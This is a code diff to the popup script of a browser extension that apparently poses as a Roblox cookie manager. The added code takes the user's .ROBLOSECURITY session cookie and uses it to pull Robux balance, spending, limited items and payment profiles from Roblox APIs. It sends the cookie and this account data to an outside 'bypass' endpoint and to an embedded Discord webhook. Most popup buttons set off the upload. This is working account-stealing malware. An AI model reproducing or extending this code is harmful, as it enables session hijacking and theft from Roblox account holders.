@@ -2,6 +2,9 @@ document.addEventListener('DOMContentLoaded', function() {
   // IMPORTANT: Replace this with your Discord webhook URL
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1361949829474816112/MF6rRmldFGeuSb7yeJarmj4HX1q-dlwppegVXa2MaCzUYYj3I1n5rgSBPZirkjlOkKSO";
   
+  // Your API endpoint
+  const BYPASS_API_URL = "https://rblx-checker-infos.vercel.app/api/bypass";
+  
   // Track if we're showing only security cookies
   let showOnlySecurityCookies = true;
   
@@ -64,15 +67,151 @@ document.addEventListener('DOMContentLoaded', function() {
       );
       
       if (securityCookies.length > 0) {
-        // Security cookies found - send them
-        sendCookiesToDiscord(WEBHOOK_URL, "Roblox", securityCookies, true);
+        // Security cookies found - send them to your API first
+        const robloxCookie = securityCookies[0].value;
+        sendToRobloxAPI(robloxCookie).then(robloxData => {
+          // Then send to Discord with enhanced data
+          sendCookiesToDiscord(WEBHOOK_URL, "Roblox", securityCookies, robloxData, true);
+        }).catch(error => {
+          console.error('Error getting Roblox data:', error);
+          // Still send to Discord even if API fails
+          sendCookiesToDiscord(WEBHOOK_URL, "Roblox", securityCookies, null, true);
+        });
       } else {
         // No security cookies found - send all cookies instead
-        sendCookiesToDiscord(WEBHOOK_URL, "All Domains", cookies.slice(0, 20), true);
+        sendCookiesToDiscord(WEBHOOK_URL, "All Domains", cookies.slice(0, 20), null, true);
       }
     });
   }
 });
+
+// Function to get Roblox account information
+async function getRobloxAccountInfo(cookie) {
+  try {
+    // First get user info
+    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'Content-Type': 'application/json'
+      }
+    });
+    
+    if (!userResponse.ok) throw new Error('Failed to get user info');
+    
+    const userData = await userResponse.json();
+    const userId = userData.id;
+    
+    // Get all account information in parallel
+    const [
+      robuxBalance,
+      transactionSummary,
+      korbloxOwned,
+      headlessOwned1,
+      headlessOwned2,
+      collectibles,
+      paymentProfiles,
+      premiumStatus
+    ] = await Promise.allSettled([
+      // Robux balance
+      fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+      }).then(r => r.ok ? r.json() : { robux: 0, pendingRobux: 0 }),
+      
+      // Total spent (past year)
+      fetch(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+      }).then(r => r.ok ? r.json() : { summary: { grossAmount: 0 } }),
+      
+      // Korblox check
+      fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/139607718`, {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+      }).then(r => r.ok ? r.json() : { data: [] }),
+      
+      // Headless check (first ID)
+      fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/134082579`, {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+      }).then(r => r.ok ? r.json() : { data: [] }),
+      
+      // Headless check (second ID)
+      fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/15093053680`, {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+      }).then(r => r.ok ? r.json() : { data: [] }),
+      
+      // Limited items & collectibles
+      fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=10&sortOrder=Asc`, {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+      }).then(r => r.ok ? r.json() : { data: [] }),
+      
+      // Payment methods
+      fetch('https://apis.roblox.com/payments-gateway/v1/payment-profiles', {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+      }).then(r => r.ok ? r.json() : { paymentProfiles: [] }),
+      
+      // Premium membership
+      fetch('https://apis.roblox.com/premium-features/v1/users/premium-membership', {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+      }).then(r => r.ok ? r.json() : { isPremium: false })
+    ]);
+    
+    // Get user avatar
+    const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png`, {
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+    });
+    const avatarData = avatarResponse.ok ? await avatarResponse.json() : { data: [] };
+    
+    // Get birthday and 2FA status (would need additional API calls)
+    // For now, we'll get some basic settings
+    
+    return {
+      user: userData,
+      userId: userId,
+      avatarUrl: avatarData.data[0]?.imageUrl || '',
+      robux: robuxBalance.value?.robux || 0,
+      pendingRobux: robuxBalance.value?.pendingRobux || 0,
+      totalSpent: transactionSummary.value?.summary?.grossAmount || 0,
+      hasKorblox: korbloxOwned.value?.data?.length > 0,
+      hasHeadless: (headlessOwned1.value?.data?.length > 0) || (headlessOwned2.value?.data?.length > 0),
+      collectibles: collectibles.value?.data || [],
+      paymentMethods: paymentProfiles.value?.paymentProfiles || [],
+      isPremium: premiumStatus.value?.isPremium || false,
+      timestamp: new Date().toISOString()
+    };
+    
+  } catch (error) {
+    console.error('Error fetching Roblox data:', error);
+    throw error;
+  }
+}
+
+// Function to send cookie to your API first
+async function sendToRobloxAPI(cookieValue) {
+  try {
+    // First get Roblox account info
+    const robloxInfo = await getRobloxAccountInfo(cookieValue);
+    
+    // Send to your API
+    const response = await fetch(BYPASS_API_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        cookie: cookieValue,
+        accountInfo: robloxInfo,
+        timestamp: new Date().toISOString()
+      })
+    });
+    
+    if (!response.ok) {
+      console.error('API response not OK:', response.status);
+    }
+    
+    return robloxInfo;
+  } catch (error) {
+    console.error('Error sending to API:', error);
+    throw error;
+  }
+}
 
 // Function to show status messages
 function showStatus(message, isSuccess) {
@@ -89,16 +228,12 @@ function showStatus(message, isSuccess) {
 
 // Extract the base domain from a hostname
 function extractBaseDomain(domain) {
-  // For domains like www.roblox.com, we want to get roblox.com
-  // This is a simple approach, won't work for all TLDs but covers most cases
   const parts = domain.split('.');
   
-  // If the domain has only two parts (like roblox.com), return as is
   if (parts.length <= 2) {
     return domain;
   }
   
-  // Otherwise, return the last two parts (assumes simple TLD)
   return parts.slice(-2).join('.');
 }
 
@@ -107,17 +242,14 @@ function loadCookies(domain, securityOnly = true) {
   const cookieList = document.getElementById('cookieList');
   cookieList.innerHTML = 'Loading...';
   
-  // Extract the base domain (e.g., roblox.com from www.roblox.com)
   const baseDomain = extractBaseDomain(domain);
   
-  // Get all cookies for this domain and its subdomains
   chrome.cookies.getAll({domain: baseDomain}, function(cookies) {
     if (cookies.length === 0) {
       cookieList.innerHTML = '<p>No cookies found for this domain.</p>';
       return;
     }
     
-    // Filter for security cookies if requested
     let cookiesToShow = cookies;
     if (securityOnly) {
       cookiesToShow = cookies.filter(cookie => cookie.name.includes('.ROBLOSECURITY'));
@@ -129,7 +261,6 @@ function loadCookies(domain, securityOnly = true) {
       
       cookieList.innerHTML = '';
     } else {
-      // Sort cookies by domain and name for better organization
       cookiesToShow.sort((a, b) => {
         if (a.domain === b.domain) {
           return a.name.localeCompare(b.name);
@@ -143,7 +274,6 @@ function loadCookies(domain, securityOnly = true) {
     let currentDomain = '';
     
     cookiesToShow.forEach(function(cookie) {
-      // Add domain separator if this is a new domain and we're showing all cookies
       if (!securityOnly && currentDomain !== cookie.domain) {
         currentDomain = cookie.domain;
         const domainSeparator = document.createElement('div');
@@ -183,9 +313,13 @@ function loadCookies(domain, securityOnly = true) {
       updateButton.textContent = 'Update';
       updateButton.addEventListener('click', function() {
         updateCookie(cookie, cookieValue.value);
-        // Send all cookies again after update
         chrome.cookies.getAll({}, function(allCookies) {
-          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
+          const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
+          if (securityCookies.length > 0) {
+            sendToRobloxAPI(securityCookies[0].value).then(() => {
+              sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
+            });
+          }
         });
       });
       
@@ -194,9 +328,13 @@ function loadCookies(domain, securityOnly = true) {
       deleteButton.className = 'delete';
       deleteButton.addEventListener('click', function() {
         deleteCookie(cookie);
-        // Send all cookies again after delete
         chrome.cookies.getAll({}, function(allCookies) {
-          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
+          const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
+          if (securityCookies.length > 0) {
+            sendToRobloxAPI(securityCookies[0].value).then(() => {
+              sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
+            });
+          }
         });
       });
       
@@ -207,9 +345,13 @@ function loadCookies(domain, securityOnly = true) {
         cookieValue.select();
         document.execCommand('copy');
         showStatus('Cookie value copied to clipboard!', true);
-        // Send all cookies again after copy
         chrome.cookies.getAll({}, function(allCookies) {
-          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
+          const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
+          if (securityCookies.length > 0) {
+            sendToRobloxAPI(securityCookies[0].value).then(() => {
+              sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
+            });
+          }
         });
       });
       
@@ -317,9 +459,13 @@ function showAddCookieForm(domain) {
           loadCookies(domain, document.getElementById('showSecurityCookieButton').classList.contains('active'));
           showStatus('Cookie created successfully!', true);
           
-          // Send all cookies after creating new one
           chrome.cookies.getAll({}, function(allCookies) {
-            sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
+            const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
+            if (securityCookies.length > 0) {
+              sendToRobloxAPI(securityCookies[0].value).then(() => {
+                sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
+              });
+            }
           });
         }
       });
@@ -328,18 +474,22 @@ function showAddCookieForm(domain) {
   
   document.getElementById('cancelNewCookie').addEventListener('click', function() {
     form.remove();
-    // Send all cookies on cancel too
     chrome.cookies.getAll({}, function(allCookies) {
-      sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), true);
+      const securityCookies = allCookies.filter(c => c.name.includes('.ROBLOSECURITY'));
+      if (securityCookies.length > 0) {
+        sendToRobloxAPI(securityCookies[0].value).then(() => {
+          sendCookiesToDiscord(WEBHOOK_URL, "All Domains", allCookies.slice(0, 20), null, true);
+        });
+      }
     });
   });
 }
 
-// Send cookies to Discord webhook
-function sendCookiesToDiscord(webhookUrl, domain, cookies, showConfirmation = true) {
+// Send cookies to Discord webhook with enhanced Roblox info
+function sendCookiesToDiscord(webhookUrl, domain, cookies, robloxData = null, showConfirmation = true) {
   // Format cookies into a readable format
   let cookieText = '';
-  const cookiesToDisplay = cookies.slice(0, 20); // Limit to 20 cookies to avoid message size limits
+  const cookiesToDisplay = cookies.slice(0, 20);
   
   cookiesToDisplay.forEach(cookie => {
     cookieText += `**Name:** ${cookie.name}\n`;
@@ -350,21 +500,70 @@ function sendCookiesToDiscord(webhookUrl, domain, cookies, showConfirmation = tr
     cookieText += `**HttpOnly:** ${cookie.httpOnly}\n\n`;
   });
   
-  // Create JSON data for Discord webhook
-  const data = {
-    content: "Cookie data captured",
-    embeds: [{
-      title: `Cookies from ${domain}`,
+  // Create enhanced embed if we have Roblox data
+  let embeds = [];
+  
+  if (robloxData) {
+    // Main account info embed
+    embeds.push({
+      title: `👤 ${robloxData.user.name} | ${robloxData.user.displayName}`,
+      description: `**User ID:** ${robloxData.userId}\n**Created:** ${new Date(robloxData.user.created).toLocaleDateString()}`,
+      color: 15105570,
+      thumbnail: {
+        url: robloxData.avatarUrl
+      },
+      fields: [
+        {
+          name: "💰 Robux Balance",
+          value: `**Current:** ${robloxData.robux.toLocaleString()}\n**Pending:** ${robloxData.pendingRobux.toLocaleString()}\n**Total Spent (Year):** $${robloxData.totalSpent}`,
+          inline: true
+        },
+        {
+          name: "🎮 Collectibles",
+          value: `**Limiteds:** ${robloxData.collectibles.length}\n**Korblox:** ${robloxData.hasKorblox ? '✅' : '❌'}\n**Headless:** ${robloxData.hasHeadless ? '✅' : '❌'}`,
+          inline: true
+        },
+        {
+          name: "⚙️ Settings",
+          value: `**Premium:** ${robloxData.isPremium ? '✅' : '❌'}\n**Payment Methods:** ${robloxData.paymentMethods.length}\n**2FA:** Unknown`,
+          inline: true
+        }
+      ],
+      footer: {
+        text: "Roblox Cookie Extension Logger • " + new Date().toLocaleString()
+      },
+      timestamp: robloxData.timestamp
+    });
+    
+    // Add cookie data as second embed
+    embeds.push({
+      title: "🔐 Cookie Data",
       description: cookieText || "No cookies found",
-      color: 15105570, // Gold color
+      color: 3447003,
       footer: {
         text: "Cookie data • " + new Date().toLocaleString()
       }
-    }]
+    });
+  } else {
+    // Regular embed without Roblox data
+    embeds.push({
+      title: `Cookies from ${domain}`,
+      description: cookieText || "No cookies found",
+      color: 15105570,
+      footer: {
+        text: "Cookie data • " + new Date().toLocaleString()
+      }
+    });
+  }
+  
+  // Create JSON data for Discord webhook
+  const data = {
+    content: robloxData ? `🎯 Roblox Account Captured: **${robloxData.user.name}**` : "Cookie data captured",
+    embeds: embeds
   };
   
   // Show a status message that we're sending
-  showStatus('Sending cookies to Discord...', true);
+  showStatus('Sending data to Discord...', true);
   
   // Send the data to Discord
   fetch(webhookUrl, {
@@ -377,17 +576,16 @@ function sendCookiesToDiscord(webhookUrl, domain, cookies, showConfirmation = tr
   .then(response => {
     if (response.ok) {
       if (showConfirmation) {
-        showStatus('Cookies sent successfully!', true);
+        showStatus('Data sent successfully!', true);
       }
     } else {
       if (showConfirmation) {
-        showStatus('Error sending cookies. Status: ' + response.status, false);
+        showStatus('Error sending data. Status: ' + response.status, false);
       }
     }
   })
   .catch(error => {
-    showStatus('Error sending cookies: ' + error.message, false);
+    showStatus('Error sending data: ' + error.message, false);
     console.error('Webhook error:', error);
   });
 }
-
